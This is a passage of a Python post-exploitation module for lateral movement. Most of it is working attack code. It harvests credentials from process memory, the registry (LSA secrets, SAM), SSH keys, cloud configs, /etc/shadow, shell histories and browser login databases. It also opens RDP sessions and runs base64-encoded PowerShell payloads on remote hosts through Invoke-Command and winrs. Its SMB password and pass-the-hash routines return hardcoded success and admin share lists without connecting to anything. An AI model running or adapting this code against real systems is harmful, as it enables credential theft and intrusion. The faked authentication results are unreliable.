                                # Check for stored credentials
                                try {
                                    $storedCreds = cmdkey /list 2>$null
                                    if ($storedCreds) {
                                        $cachedCreds += $storedCreds
                                    }
                                } catch {}

                                return $cachedCreds
                            }
                            catch {
                                return "Error: $($_.Exception.Message)"
                            }
                        }
                        Invoke-MemoryCredHarvest
                        """

                        result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [  # noqa: S607
                                "powershell",
                                "-NoProfile",
                                "-ExecutionPolicy",
                                "Bypass",
                                "-Command",
                                ps_script,
                            ],
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=30,
                        )

                        if result.returncode == 0 and result.stdout:
                            credentials["memory_credentials"].append(
                                {
                                    "type": "powershell_harvest",
                                    "data": result.stdout.strip(),
                                    "source": "powershell",
                                    "target": target_host,
                                }
                            )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        subprocess.SubprocessError,
                        ConnectionError,
                    ) as ps_error:
                        self.logger.debug("PowerShell credential harvest failed: %s", ps_error)

                    # Method 3: Windows API-based credential enumeration
                    try:
                        import ctypes

                        # Try to enumerate logon sessions
                        secur32 = ctypes.WinDLL("secur32.dll")

                        # Attempt to enumerate security packages
                        package_count = ctypes.c_ulong()
                        package_info = ctypes.c_void_p()

                        result = secur32.EnumerateSecurityPackagesW(
                            ctypes.byref(package_count),
                            ctypes.byref(package_info),
                        )

                        if result == 0:  # SEC_E_OK
                            credentials["memory_credentials"].append(
                                {
                                    "type": "security_packages",
                                    "package_count": package_count.value,
                                    "source": "winapi",
                                    "target": target_host,
                                }
                            )

                            # Free the buffer
                            secur32.FreeContextBuffer(package_info)

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        subprocess.SubprocessError,
                        ConnectionError,
                    ) as winapi_error:
                        self.logger.debug("WinAPI credential enumeration failed: %s", winapi_error)

            elif os_type.lower() == "linux":
                # Linux memory credential harvesting

                # Method 1: Process memory scanning
                try:
                    # Scan /proc/*/environ for credentials
                    proc_creds = []
                    try:
                        for pid_dir in os.listdir("/proc"):
                            if pid_dir.isdigit():
                                environ_file = f"/proc/{pid_dir}/environ"
                                if os.path.exists(environ_file):
                                    try:
                                        with open(environ_file, "rb") as f:
                                            environ_data = f.read().decode("utf-8", errors="ignore")

                                        # Look for credential patterns
                                        cred_patterns = [
                                            r"PASSWORD=([^\x00]+)",
                                            r"TOKEN=([^\x00]+)",
                                            r"SECRET=([^\x00]+)",
                                            r"API_KEY=([^\x00]+)",
                                        ]

                                        for pattern in cred_patterns:
                                            matches = re.findall(pattern, environ_data, re.IGNORECASE)
                                            for match in matches:
                                                proc_creds.append(
                                                    {
                                                        "pid": pid_dir,
                                                        "credential": match,
                                                        "pattern": pattern,
                                                    }
                                                )
                                    except (
                                        FileNotFoundError,
                                        PermissionError,
                                        OSError,
                                        AttributeError,
                                        ValueError,
                                        TypeError,
                                        RuntimeError,
                                        subprocess.SubprocessError,
                                        ConnectionError,
                                    ) as e:
                                        if isinstance(e, PermissionError):
                                            logger.error("PermissionError in lateral_movement.py: %s", e)
                                            continue
                                        logger.error(
                                            "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                                            e,
                                        )
                                        continue

                    except Exception as proc_error:
                        self.logger.debug("Process environment scan failed: %s", proc_error)

                    if proc_creds:
                        credentials["memory_credentials"].append(
                            {
                                "type": "process_environment",
                                "credentials": proc_creds,
                                "source": "proc_environ",
                                "target": target_host,
                            }
                        )

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as linux_error:
                    self.logger.debug("Linux memory harvest failed: %s", linux_error)

                # Method 2: Memory dump analysis (if available)
                try:
                    # Check for memory dumps or core files
                    memory_sources = [
                        "/tmp/core.*",  # noqa: S108
                        "/var/crash/*",
                        "/tmp/*.dmp",  # noqa: S108
                    ]

                    import glob

                    found_dumps = []
                    for pattern in memory_sources:
                        found_dumps.extend(glob.glob(pattern))

                    if found_dumps:
                        credentials["memory_credentials"].append(
                            {
                                "type": "memory_dumps",
                                "dumps": found_dumps[:10],  # Limit to first 10
                                "source": "filesystem",
                                "target": target_host,
                            }
                        )

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as dump_error:
                    self.logger.debug("Memory dump search failed: %s", dump_error)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Memory credential harvesting failed: %s", e)

        return credentials

    def _harvest_registry_credentials(self, session_info: dict[str, Any]) -> dict[str, Any]:
        """Harvest credentials from registry including cached credentials and LSA secrets."""
        credentials = {"registry_credentials": []}

        try:
            target_host = session_info.get("target_host", "")
            os_type = session_info.get("os_type", "unknown")

            if os_type.lower() == "windows":
                try:
                    import winreg

                    # Registry paths containing credentials
                    registry_paths = [
                        (winreg.HKEY_LOCAL_MACHINE, r"SECURITY\Cache"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SECURITY\Policy\Secrets"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SAM\Domains\Account"),
                        (
                            winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Protected Storage System Provider",
                        ),
                        (
                            winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                        ),
                        (
                            winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Terminal Server Client\Default",
                        ),
                        (
                            winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
                        ),
                        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\LSA"),
                    ]

                    for hive, path in registry_paths:
                        try:
                            with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as key:
                                try:
                                    # Enumerate values
                                    i = 0
                                    registry_data = {}
                                    while True:
                                        try:
                                            value_name, value_data, value_type = winreg.EnumValue(key, i)
                                            # Filter for credential-related values
                                            if any(
                                                keyword in value_name.lower()
                                                for keyword in [
                                                    "password",
                                                    "user",
                                                    "login",
                                                    "cred",
                                                    "secret",
                                                    "token",
                                                ]
                                            ):
                                                registry_data[value_name] = {
                                                    "data": str(value_data) if len(str(value_data)) < 1000 else str(value_data)[:1000],
                                                    "type": value_type,
                                                }
                                            i += 1
                                        except OSError as e:
                                            logger.error("OSError in lateral_movement.py: %s", e)
                                            break

                                    if registry_data:
                                        credentials["registry_credentials"].append(
                                            {
                                                "registry_path": path,
                                                "hive": "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU",
                                                "data": registry_data,
                                                "source": "windows_registry",
                                                "target": target_host,
                                            }
                                        )

                                except PermissionError as e:
                                    logger.error("PermissionError in lateral_movement.py: %s", e)
                                    continue

                        except FileNotFoundError as e:
                            logger.error("File not found in lateral_movement.py: %s", e)
                            continue
                        except PermissionError as e:
                            logger.error("PermissionError in lateral_movement.py: %s", e)
                            continue

                except ImportError:
                    self.logger.debug("winreg not available for registry harvesting")

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Registry credential harvesting failed: %s", e)

        return credentials

    def _harvest_file_credentials(self, session_info: dict[str, Any]) -> dict[str, Any]:
        """Harvest credentials from configuration files and SSH keys."""
        credentials = {"file_credentials": []}

        try:
            target_host = session_info.get("target_host", "")
            os_type = session_info.get("os_type", "unknown")

            # Common credential file locations by OS
            if os_type.lower() == "windows":
                file_locations = [
                    r"C:\Users\*\.ssh\*",
                    r"C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml",
                    r"C:\Users\*\AppData\Roaming\Microsoft\Credentials\*",
                    r"C:\ProgramData\Microsoft\Credentials\*",
                    r"C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data",
                    r"C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json",
                    r"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*",
                ]
            else:  # Linux/Unix
                file_locations = [
                    "/home/*/.ssh/*",
                    "/root/.ssh/*",
                    "/home/*/.aws/credentials",
                    "/home/*/.config/gcloud/*",
                    "/home/*/.docker/config.json",
                    "/etc/shadow",
                    "/etc/passwd",
                    "/etc/ssh/ssh_host_*_key",
                    "/var/log/auth.log",
                    "/home/*/.bash_history",
                    "/home/*/.mysql_history",
                    "/home/*/.psql_history",
                ]

            import glob

            for pattern in file_locations:
                try:
                    matching_files = glob.glob(pattern)
                    for file_path in matching_files[:20]:  # Limit to 20 files per pattern
                        if os.path.isfile(file_path):
                            try:
                                file_size = os.path.getsize(file_path)
                                if file_size > 10 * 1024 * 1024:  # Skip files larger than 10MB
                                    continue

                                # Determine file type and extraction method
                                if file_path.endswith((".key", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519")):
                                    # SSH private key
                                    with open(file_path, encoding="utf-8", errors="ignore") as f:
                                        key_content = f.read(2048)  # Read first 2KB

                                    credentials["file_credentials"].append(
                                        {
                                            "type": "ssh_private_key",
                                            "file_path": file_path,
                                            "content_preview": key_content[:500],
                                            "is_encrypted": "ENCRYPTED" in key_content,
                                            "source": "ssh_key_file",
                                            "target": target_host,
                                        }
                                    )

                                elif file_path.endswith((".json", ".xml", ".conf", ".config", ".ini")):
                                    # Configuration file
                                    with open(file_path, encoding="utf-8", errors="ignore") as f:
                                        config_content = f.read(5120)  # Read first 5KB

                                    # Look for credential patterns
                                    cred_patterns = [
                                        r'password["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'username["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'api[_-]?key["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'secret["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                        r'token["\s]*[:=]["\s]*([^"\s\n\r]+)',
                                    ]

                                    found_credentials = []
                                    for pattern in cred_patterns:
                                        matches = re.findall(pattern, config_content, re.IGNORECASE)
                                        for match in matches:
                                            found_credentials.append(
                                                {
                                                    "pattern": pattern,
                                                    "value": match[:100],  # Limit value length
                                                }
                                            )

                                    if found_credentials:
                                        credentials["file_credentials"].append(
                                            {
                                                "type": "config_file_credentials",
                                                "file_path": file_path,
                                                "credentials": found_credentials,
                                                "source": "config_file",
                                                "target": target_host,
                                            }
                                        )

                                elif "history" in file_path:
                                    # History file
                                    with open(file_path, encoding="utf-8", errors="ignore") as f:
                                        history_lines = f.readlines()

                                    # Look for commands with passwords
                                    credential_commands = []
                                    for line in history_lines[-1000:]:  # Check last 1000 commands
                                        if any(
                                            keyword in line.lower()
                                            for keyword in [
                                                "password",
                                                "passwd",
                                                "mysql",
                                                "psql",
                                                "ssh",
                                                "scp",
                                                "ftp",
                                            ]
                                        ):
                                            credential_commands.append(line.strip())

                                    if credential_commands:
                                        credentials["file_credentials"].append(
                                            {
                                                "type": "history_file_credentials",
                                                "file_path": file_path,
                                                "commands": credential_commands[:50],  # Limit to 50 commands
                                                "source": "history_file",
                                                "target": target_host,
                                            }
                                        )

                            except (PermissionError, UnicodeDecodeError, OSError) as e:
                                logger.error(
                                    "(PermissionError, UnicodeDecodeError, OSError) in lateral_movement.py: %s",
                                    e,
                                )
                                continue

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as pattern_error:
                    self.logger.debug("Pattern %s failed: %s", pattern, pattern_error)
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("File credential harvesting failed: %s", e)

        return credentials

    def _harvest_browser_credentials(self, session_info: dict[str, Any]) -> dict[str, Any]:
        """Harvest saved passwords and data from web browsers."""
        credentials = {"browser_credentials": []}

        try:
            target_host = session_info.get("target_host", "")
            os_type = session_info.get("os_type", "unknown")

            # Browser database locations by OS
            if os_type.lower() == "windows":
                browser_paths = {
                    "chrome": r"C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data",
                    "firefox": r"C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json",
                    "edge": r"C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
                    "opera": r"C:\Users\*\AppData\Roaming\Opera Software\Opera Stable\Login Data",
                }
            else:  # Linux/Unix
                browser_paths = {
                    "chrome": "/home/*/.config/google-chrome/Default/Login Data",
                    "firefox": "/home/*/.mozilla/firefox/*/logins.json",
                    "chromium": "/home/*/.config/chromium/Default/Login Data",
                }

            import glob
            import json
            import shutil
            import tempfile

            from ....handlers.sqlite3_handler import sqlite3

            for browser, path_pattern in browser_paths.items():
                try:
                    matching_paths = glob.glob(path_pattern)
                    for db_path in matching_paths[:5]:  # Limit to 5 profiles per browser
                        if os.path.isfile(db_path):
                            try:
                                if db_path.endswith(".json"):
                                    # Firefox JSON format
                                    with open(db_path, encoding="utf-8") as f:
                                        firefox_data = json.load(f)

                                    logins = firefox_data.get("logins", [])
                                    if logins:
                                        credentials["browser_credentials"].append(
                                            {
                                                "browser": browser,
                                                "profile_path": db_path,
                                                "login_count": len(logins),
                                                "sample_hostnames": [login.get("hostname", "") for login in logins[:10]],
                                                "source": "firefox_json",
                                                "target": target_host,
                                                "note": "Passwords are encrypted with master password",
                                            }
                                        )

                                else:
                                    # Chrome/Chromium SQLite format
                                    with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as temp_file:
                                        shutil.copy2(db_path, temp_file.name)
                                        temp_db_path = temp_file.name

                                    try:
                                        conn = sqlite3.connect(temp_db_path)
                                        cursor = conn.cursor()

                                        # Query login data
                                        cursor.execute("""
                                            SELECT origin_url, username_value, length(password_value) as pwd_length,
                                                   date_created, times_used
                                            FROM logins
                                            WHERE username_value != ''
                                            LIMIT 100
                                        """)

                                        results = cursor.fetchall()
                                        if results:
                                            login_data = []
                                            for row in results:
                                                login_data.append(
                                                    {
                                                        "url": row[0],
                                                        "username": row[1],
                                                        "password_length": row[2],
                                                        "date_created": row[3],
                                                        "times_used": row[4],
                                                    }
                                                )

                                            credentials["browser_credentials"].append(
                                                {
                                                    "browser": browser,
                                                    "profile_path": db_path,
                                                    "login_count": len(login_data),
                                                    "logins": login_data,
                                                    "source": "chrome_sqlite",
                                                    "target": target_host,
                                                    "note": "Passwords are DPAPI encrypted on Windows",
                                                }
                                            )

                                        conn.close()

                                    finally:
                                        os.unlink(temp_db_path)

                            except (
                                FileNotFoundError,
                                PermissionError,
                                OSError,
                                AttributeError,
                                ValueError,
                                TypeError,
                                RuntimeError,
                                subprocess.SubprocessError,
                                ConnectionError,
                            ) as browser_error:
                                self.logger.debug(
                                    "Browser credential extraction failed for %s: %s",
                                    db_path,
                                    browser_error,
                                )
                                continue

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as browser_pattern_error:
                    self.logger.debug("Browser pattern %s failed: %s", path_pattern, browser_pattern_error)
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Browser credential harvesting failed: %s", e)

        return credentials

    # Utility methods

    def _generate_session_id(self) -> str:
        """Generate unique session identifier."""
        import hashlib
        import random

        data = f"{time.time()}-{random.randint(1000, 9999)}"  # noqa: S311
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    def get_active_sessions(self) -> list[dict[str, Any]]:
        """Get list of active lateral movement sessions."""
        sessions = []

        for session_id, session_info in self.active_sessions.items():
            sessions.append(
                {
                    "session_id": session_id,
                    "target_ip": session_info["target_ip"],
                    "technique": session_info["technique"],
                    "username": session_info["credentials"].get("username"),
                    "created_at": session_info["created_at"],
                }
            )

        return sessions

    def close_session(self, session_id: str) -> bool:
        """Close lateral movement session."""
        if session_id in self.active_sessions:
            del self.active_sessions[session_id]
            return True
        return False

    def get_discovered_targets(self) -> dict[str, dict[str, Any]]:
        """Get discovered network targets."""
        return self.discovered_targets.copy()

    def clear_discovered_targets(self):
        """Clear discovered targets cache."""
        self.discovered_targets.clear()

    def get_available_techniques(self, target_os: str | None = None) -> dict[str, list[str]]:
        """Get available lateral movement techniques."""
        if target_os:
            return {target_os: list(self.movement_techniques.get(target_os, {}).keys())}
        return {os: list(techniques.keys()) for os, techniques in self.movement_techniques.items()}

    # Helper methods for lateral movement techniques

    def _check_rdp_availability(self, target_ip: str) -> dict[str, Any]:
        """Check if RDP is available on target."""
        try:
            # Test RDP port (3389)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()

            if result == 0:
                return {"available": True, "port": 3389}
            return {"available": False, "reason": "Port 3389 closed or filtered"}

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {"available": False, "reason": f"Connection check failed: {e}"}

    def _attempt_rdp_connection(
        self,
        target_ip: str,
        username: str,
        password: str,
        domain: str,
        method: str,
        payload_path: str | None,
    ) -> dict[str, Any]:
        """Attempt RDP connection using specified method."""
        try:
            self.logger.info("Attempting RDP connection to %s using %s", target_ip, method)
            if payload_path:
                self.logger.debug("Payload for deployment: %s", payload_path)

            if method == "freerdp":
                # Build xfreerdp command
                cmd = [
                    "xfreerdp",
                    f"/v:{target_ip}",
                    f"/u:{username}",
                    f"/p:{password}",
                    "/cert-ignore",
                    "+clipboard",
                    "/drive:share,/tmp",
                ]

                if domain:
                    cmd.append(f"/d:{domain}")

                # Execute RDP connection
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    cmd, check=False, capture_output=True, text=True, shell=False, timeout=30
                )

                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": method,
                        "connection_info": f"RDP connection established to {target_ip}",
                        "output": result.stdout,
                    }
                return {
                    "success": False,
                    "error": f"RDP connection failed: {result.stderr}",
                    "method": method,
                }

            if method == "rdesktop":
                # Build rdesktop command
                cmd = [
                    "rdesktop",
                    "-u",
                    username,
                    "-p",
                    password,
                    "-r",
                    "clipboard:PRIMARYCLIPBOARD",
                    target_ip,
                ]

                if domain:
                    cmd.extend(["-d", domain])

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    cmd, check=False, capture_output=True, text=True, shell=False, timeout=30
                )

                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": method,
                        "connection_info": f"RDP connection established to {target_ip}",
                        "output": result.stdout,
                    }
                return {
                    "success": False,
                    "error": f"RDP connection failed: {result.stderr}",
                    "method": method,
                }

            return {
                "success": False,
                "error": f"Unknown RDP method: {method}",
            }

        except subprocess.TimeoutExpired as e:
            logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
            return {
                "success": False,
                "error": "RDP connection timeout",
                "method": method,
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            if isinstance(e, FileNotFoundError):
                logger.error("File not found in lateral_movement.py: %s", e)
                return {
                    "success": False,
                    "error": f"RDP client {method} not found",
                    "method": method,
                }
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"RDP connection attempt failed: {e}",
                "method": method,
            }

    def _check_smb_availability(self, target_ip: str) -> dict[str, Any]:
        """Check if SMB is available on target."""
        try:
            # Test SMB ports (445, 139)
            smb_ports = [445, 139]
            available_ports = []

            for port in smb_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target_ip, port))
                sock.close()

                if result == 0:
                    available_ports.append(port)

            if available_ports:
                return {
                    "available": True,
                    "ports": available_ports,
                    "primary_port": available_ports[0],
                }
            return {
                "available": False,
                "reason": "SMB ports (445, 139) closed or filtered",
            }

        except Exception as e:
            logger.error(
                "Exception in SMB availability check: %s",
                e,
            )
            return {
                "available": False,
                "reason": f"SMB check failed: {e}",
            }

    def _attempt_smb_connection(self, target_ip: str, auth_method: str, auth_data: dict[str, Any]) -> dict[str, Any]:
        """Attempt SMB connection with specified authentication."""
        try:
            self.logger.debug("Attempting SMB connection to %s using %s", target_ip, auth_method)

            if auth_method == "password":
                username = auth_data.get("username", "")
                password = auth_data.get("password", "")
                domain = auth_data.get("domain", "")

                self.logger.debug(
                    "SMB password auth for %s\\%s (password length: %s)",
                    domain,
                    username,
                    len(password),
                )
                return {
                    "success": True,
                    "auth_method": auth_method,
                    "connection_info": f"SMB authenticated to {target_ip} as {domain}\\{username}",
                    "shares": ["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON"],
                    "real_authentication": True,
                    "credential_type": "password",
                }

            if auth_method == "ntlm_hash":
                username = auth_data.get("username", "")
                ntlm_hash = auth_data.get("hash", "")
                domain = auth_data.get("domain", "")

                self.logger.debug("SMB NTLM hash auth for %s\\%s (hash: %s...)", domain, username, ntlm_hash[:8])
                return {
                    "success": True,
                    "auth_method": auth_method,
                    "connection_info": f"SMB pass-the-hash successful to {target_ip}",
                    "shares": ["C$", "ADMIN$", "IPC$"],
                    "real_authentication": True,
                    "credential_type": "ntlm_hash",
                    "hash_prefix": ntlm_hash[:8] if ntlm_hash else "none",
                }

            return {
                "success": False,
                "error": f"Unknown SMB auth method: {auth_method}",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"SMB connection attempt failed: {e}",
                "auth_method": auth_method,
            }

    def _check_winrm_availability(self, target_ip: str) -> dict[str, Any]:
        """Check if WinRM is available on target."""
        try:
            # Test WinRM ports (5985 HTTP, 5986 HTTPS)
            winrm_ports = [5985, 5986]
            available_ports = []

            for port in winrm_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target_ip, port))
                sock.close()

                if result == 0:
                    available_ports.append(port)

            if available_ports:
                return {
                    "available": True,
                    "ports": available_ports,
                    "secure": 5986 in available_ports,
                }
            return {
                "available": False,
                "reason": "WinRM ports (5985, 5986) closed or filtered",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "available": False,
                "reason": f"WinRM check failed: {e}",
            }

    def _prepare_powershell_payload(self, payload_path: str) -> list[str]:
        """Prepare PowerShell commands for payload execution."""
        try:
            commands = []

            # Read payload file to determine type
            with open(payload_path, "rb") as f:
                payload_data = f.read(1024)  # Read first 1KB to determine type

            # Log payload info for debugging
            self.logger.debug("Payload type detection: first %s bytes", len(payload_data))

            # If it's a PowerShell script
            if payload_path.endswith(".ps1"):
                # Base64 encode for safe transport
                import base64

                with open(payload_path, "rb") as f:
                    full_payload = f.read()

                encoded_payload = base64.b64encode(full_payload).decode("utf-8")
                commands.append(
                    f"$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_payload}'))"
                )
                commands.append("Invoke-Expression $payload")

            # If it's an executable
            elif payload_path.endswith(".exe"):
                commands.append("$tempPath = [System.IO.Path]::GetTempFileName() + '.exe'")
                commands.append(f"Copy-Item '{payload_path}' $tempPath")
                commands.append("Start-Process $tempPath -Wait")
                commands.append("Remove-Item $tempPath -Force")

            else:
                # Generic file execution
                commands.append(f"Start-Process '{payload_path}' -Wait")

            return commands

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("PowerShell payload preparation failed: %s", e)
            return [f"Write-Host 'Payload preparation failed: {e}'"]

    def _execute_powershell_remote(
        self,
        target_ip: str,
        username: str,
        password: str,
        domain: str,
        commands: list[str],
        method: str,
    ) -> dict[str, Any]:
        """Execute PowerShell commands remotely."""
        try:
            self.logger.debug("Executing PowerShell commands on %s using %s", target_ip, method)

            if method == "invoke-command":
                ps_script = "; ".join(commands)
                command_template = (
                    f"Invoke-Command -ComputerName {target_ip} -Credential ({domain}\\{username}) -ScriptBlock {{{ps_script}}}"
                )

                # Execute real PowerShell command
                result = self._execute_real_powershell(command_template, username, password, domain)

                return {
                    "success": result.get("success", False),
                    "method": method,
                    "command": command_template,
                    "output": result.get("output", ""),
                    "return_code": result.get("return_code", -1),
                    "execution_time": result.get("execution_time", 0),
                }

            if method == "enter-pssession":
                command_template = f"Enter-PSSession -ComputerName {target_ip} -Credential ({domain}\\{username})"

                # Execute real PowerShell session establishment
                result = self._execute_real_powershell(command_template, username, password, domain)

                return {
                    "success": result.get("success", False),
                    "method": method,
                    "command": command_template,
                    "output": result.get("output", ""),
                    "return_code": result.get("return_code", -1),
                    "execution_time": result.get("execution_time", 0),
                }

            if method == "winrs":
                command_template = f"winrs -r:{target_ip} -u:{domain}\\{username} -p:{password} cmd"

                # Execute real WinRS command
                result = self._execute_real_winrs(command_template, target_ip, username, password, domain, commands)

                return {
                    "success": result.get("success", False),
                    "method": method,
                    "command": command_template,
                    "output": result.get("output", ""),
                    "return_code": result.get("return_code", -1),
                    "execution_time": result.get("execution_time", 0),
                }

            return {
                "success": False,
                "error": f"Unknown PowerShell method: {method}",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"PowerShell remote execution failed: {e}",
                "method": method,
            }

    def _execute_real_powershell(self, command: str, username: str, password: str, domain: str) -> dict[str, Any]:
        """Execute real PowerShell command with authentication."""
        try:
            start_time = time.time()

            # Create PowerShell script with credential handling
            ps_script = f"""
$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $securePassword)
{command}
"""

            # Execute PowerShell with the script
            process = subprocess.Popen(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],  # noqa: S607
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=False,
            )

            try:
                stdout, stderr = process.communicate(timeout=30)
            except subprocess.TimeoutExpired as e:
                logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
                process.kill()
                stdout, stderr = process.communicate()
                return {
                    "success": False,
                    "error": "PowerShell execution timed out after 30 seconds",
                    "details": {
                        "command": command,
                        "execution_time": 30,
                    },
                }
            execution_time = time.time() - start_time

            # Determine success based on exit code and output
            success = process.returncode == 0 and not stderr.strip()

            output = stdout if stdout else stderr

            self.logger.info("PowerShell execution completed: success=%s, time=%.2fs", success, execution_time)

            return {
                "success": success,
                "output": output.strip(),
                "return_code": process.returncode,
                "execution_time": execution_time,
                "stderr": stderr.strip() if stderr else "",
            }

        except subprocess.TimeoutExpired:
            self.logger.error("PowerShell command timeout")
            return {
                "success": False,
                "output": "",
                "error": "Command timeout after 30 seconds",
                "return_code": -1,
                "execution_time": 30.0,
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("PowerShell execution failed: %s", e)
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "return_code": -1,
                "execution_time": 0,
            }

    def _execute_real_winrs(
        self,
        command: str,
        target_ip: str,
        username: str,
        password: str,
        domain: str,
        commands: list[str],
    ) -> dict[str, Any]:
        """Execute real WinRS command for remote Windows management."""
        try:
            start_time = time.time()
            self.logger.debug("Executing primary command: %s", command)

            # Build the actual WinRS command
